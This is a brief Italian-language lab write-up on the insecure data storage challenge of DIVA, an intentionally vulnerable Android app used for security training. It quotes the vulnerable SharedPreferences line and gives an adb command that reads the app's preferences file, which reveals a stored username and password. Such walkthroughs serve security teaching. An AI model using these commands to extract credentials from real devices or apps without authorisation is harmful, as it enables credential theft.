## Insecure Data Storage - Part 1

Codice Vulnerabile:

> app/src/main/java/jakhar/aseem/diva/InsecureDataStorage1Activity.java

```
SharedPreferences spref = PreferenceManager.getDefaultSharedPreferences(this);
```

SharedPreferences salva le coppie chiave-valore in un file (privato o condiviso).

Exploit:

`$ adb shell`

`# cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml`

```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
	<string name="user">john</string>
	<string name="password">lock</string>
</map>
```
